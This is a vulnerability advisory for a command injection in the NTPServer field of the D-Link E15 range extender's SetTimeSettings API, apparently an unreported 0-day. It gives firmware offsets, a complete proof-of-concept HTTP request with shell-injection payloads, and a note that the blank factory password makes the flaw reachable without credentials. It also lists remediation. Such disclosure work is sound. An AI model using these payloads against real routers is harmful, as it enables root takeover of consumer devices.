# D-Link E15 1.20.01 was discovered to contain a command injection vulnerability in SetTimeSettings

## Overview

- Vendor: D-Link
- Product: E15 AX1800 Mesh Range Extender
- Version: 1.20.01
- Component: bin/httpd DHMAPI, usr/sbin/commander, usr/bin/syncdateNTP.sh
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative, authenticated admin): 7.2 High `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` With the factory-default blank administrator password (see below) the effective score is 9.8 (`PR:N`).
- Manufacturer: https://www.dlink.com/

## Affected versions

- `E15_reva_Firmware_12001.bin`.
  (`MH01` container decrypted with the delink-ng E15 key
  `044b4e59846ecee953662ff2238fcc23`; see
  `20261108-dlink-e15-12001-triage-01`).
- `bin/httpd`.
- `usr/sbin/commander`.
- `lib/libutils.so`.
  (`_exec_cmd`).
- `usr/bin/syncdateNTP.sh`.

## Vulnerability details

### 1. `SetTimeSettings` writes the `NTPServer` field to csman CSID 0x70010

The DHMAPI action table contains an entry for `SetTimeSettings`
(name string at image offset `0x4b212c`; table entry at `0x4db2b0`):

```text
0x4db2b0: name = 0x4b212c ("SetTimeSettings")
          flags = 0x01000000
          handler 1 = 0x462b88
          handler 2 = 0x462db8
```

`0x462b88` is the setter. It calls the XML-field applier `0x462950`
with the parsed `{name, value}` list. `0x462950` compares each field
name against `TZLocation`, `NTP`, `NTPServer` and
`ManualDaylightSaving` (strings at `0x4bd188`, `0x4bd194`,
`0x4bd198`, `0x4bd280`). For a field named `NTPServer` the value is
stored in a local, and the applier executes:

```c
/* httpd, 0x462ab8: write_csman_str(GOT 0x4da16c) */
write_csman_str(csman_handle, 0x00070010, ntpserver_value);
```

There is no syntax validation of `ntpserver_value`; it is written to
csman as an arbitrary string. The same handler also writes
`0x80070001 = 1` (`0x462c20`), the "sync time now" request flag.

### 2. `commander` executes CSID 0x70010 through a shell

`commander` (`handle_time.c`, function `nf_handle_time` at image
offset `0x42ad4c`) processes the csman flag `0x80070001`. Then, in
the NTP branch, it reads CSID `0x00070010` as a string:

```c
read_csman_string(handle, 0x00070010, buf, 0x50, 4);   /* 0x42b178 */
```

and builds the command:

```text
0x47f0ac: syncdateNTP.sh "%s"
```

The string is passed as the `%s` argument to the libutils `_exec_cmd`
wrapper (`0x42b580`; PLT `0x497500`, GOT `_exec_cmd`):

```c
_exec_cmd(gettid(), "handle_time.c", "nf_handle_time", 970,
          "syncdateNTP.sh \"%s\"", buf);
```

`_exec_cmd` (libutils offset `0x1868`) formats the command with
`vsnprintf(buf, 1024, fmt, va)` and executes the resulting buffer
with `pox_system(buf)`; `pox_system` (`0x1710`) calls `system()`
under a mutex. The value is only wrapped in double quotes, so shell
metacharacters still apply:

- `$()` and backticks are expanded inside double quotes;
- a `"` closes the quote and allows `;`, `|`, `&&`, etc.

`syncdateNTP.sh` additionally expands `$1` unquoted into
`NTP $1` / `/usr/bin/ntpclient ... -h $1`, but the primary injection
is the `system()` command constructed by `commander`.

## PoC

Prerequisite: an authenticated DHMAPI session (admin). On a device
that still has the factory configuration, the administrator password
is empty, so the login challenge/response succeeds with an empty
password (confirmed on the stock rootfs in the E15 DoS run).

The request (HMAC-SHA256 `API-AUTH` as for any authenticated action;
the exact challenge/cookie values are obtained from
`API-ACTION: Login` with `<Action>request</Action>`):

```http
POST /DHMAPI/ HTTP/1.0
Host: <router>
Content-Type: text/xml
API-ACTION: SetTimeSettings
API-AUTH: <hmac> <timestamp>
Cookie: uid=<cookie>
Content-Length: <n>

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SetTimeSettings>
 <CurrentDate>2024-01-01</CurrentDate>
 <CurrentTime>00:00:00</CurrentTime>
 <NTP>1</NTP>
 <NTPServer>$(cp&lt;/etc/group&gt;/var/tmp/ntp_pwn)</NTPServer>
 <TimeZone>+08:00</TimeZone>
 <DaylightSaving>0</DaylightSaving>
</SetTimeSettings>
</soap:Body>
</soap:Envelope>
```

The `NTPServer` value is stored verbatim in csman `0x70010`;
`commander` then executes:

```sh
syncdateNTP.sh "$(cp</etc/group>/var/tmp/ntp_pwn)"
```

Because the substitution is inside double quotes, the shell runs
`cp /etc/group /var/tmp/ntp_pwn` before `syncdateNTP.sh`. A value
such as `";cp /etc/group /var/tmp/ntp_pwn;#` also works and does not
depend on `$()` handling.

## Verification status

- Static: complete chain from the `SetTimeSettings` field parser to
  `write_csman_str(0x70010)`, then `commander` reading `0x70010`,
  formatting `syncdateNTP.sh "%s"`, and `_exec_cmd` `-> pox_system
  -> system()` (all offsets above are from the stock binaries).
- Dynamic: the stock rootfs was started under `qemu-mips-static` with
  `csmanuds`, `commander` and `httpd`. The emulated httpd enters the
  firmware-upgrade rescue mode because the MTD devices are absent
  (`/dev/mtd1` cannot be opened), so every `/DHMAPI/` request returns
  `400 Bad Request` before dispatch and the final execution could not
  be observed in this environment. The earlier Login NULL-dereference
  run shows the DHMAPI Login parser is reachable under the same
  emulator, so the block is environmental (missing MTD/upgrade state),
  not a code-path contradiction.
- The NTP branch in `commander` is additionally gated by WAN/time
  state (`0x42b140`..`0x42b16c`); on a deployed router with WAN up the
  periodic/triggered time sync passes this gate and executes the
  stored server string.

## Impact

An attacker with administrator access (or the factory-default empty
password) can execute arbitrary commands as root on the device. The
payload is stored persistently in csman and runs when the time sync is
triggered (immediately via the `0x80070001` flag or at the next
scheduled sync). This is a different component and root cause from the
unauthenticated Login NULL-dereference DoS on the same firmware.

## Remediation

- Validate `NTPServer` as an IP address or a hostname matching
  `[A-Za-z0-9.-]+` before storing it.
- Do not build shell commands with `system()`. Invoke
  `/usr/bin/syncdateNTP.sh` (or `ntpclient`) with `execve` and the
  server as a separate argv element.
- Quote/escape `$1` inside `syncdateNTP.sh` and `NTP`
  (`ntpclient -h "$1"`), and reject shell metacharacters.
- Force a non-empty administrator password at first boot; the blank
  factory password turns this authenticated issue into an
  unauthenticated one.

## Known-CVE relation

- NVD keyword searches on 2026-11-08 for `D-Link E15` returned only
  CVE-2026-112146 (hard-coded MQTT broker credentials in
  `/etc/emDaemon/passwd`), a different component and issue class.
- No entry for this `SetTimeSettings`/`NTPServer` command injection on
  the E15 was found. Candidate 0-day; no CVE assigned and no vendor
  contact has been made.

## Evidence

`experiments/vulnerability-triage/results/20261108-dlink-e15-12001-ntp-lead-01/`

- `RUN.md` — reverse-engineering notes, csman write/read tests, and
  the emulation limitation.
- `evidence/cmdtest2.py`, `evidence/wtest2.py` — csman
  `0x70010`/`0x80070001` write and trigger tests (flag cleared by
  `commander`).
- `evidence/driver9.log`, `evidence/driver10`-related logs in the
  scratch run directory — DHMAPI attempts; the upgrade-mode `400`
  responses are environmental.

## Additional Information

```markdown
### Vendor
D-Link

### Product
E15 AX1800 Mesh Range Extender

### Version or Commit
1.20.01

### Vulnerability Class
CWE-78 command injection

### Description
The SetTimeSettings DHMAPI action stores the NTPServer field verbatim in csman object 0x70010. commander reads that object and executes syncdateNTP.sh "%s" through _exec_cmd, pox_system and system(), so a crafted NTPServer value executes shell commands. Factory units have an empty administrator password, making the action reachable without prior credentials.

### Affected_component
bin/httpd DHMAPI, usr/sbin/commander, usr/bin/syncdateNTP.sh

### Attack_vector
Authenticated (or factory-default blank password) DHMAPI SetTimeSettings with a crafted NTPServer value; commander executes it on the next time sync.

### Product_version
E15 AX1800 Mesh Range Extender 1.20.01

### Reference
- https://www.dlink.com/
- https://github.com/vuln-1/vuln/blob/main/D-Link/E15_V1.20.01/report-1.md
```
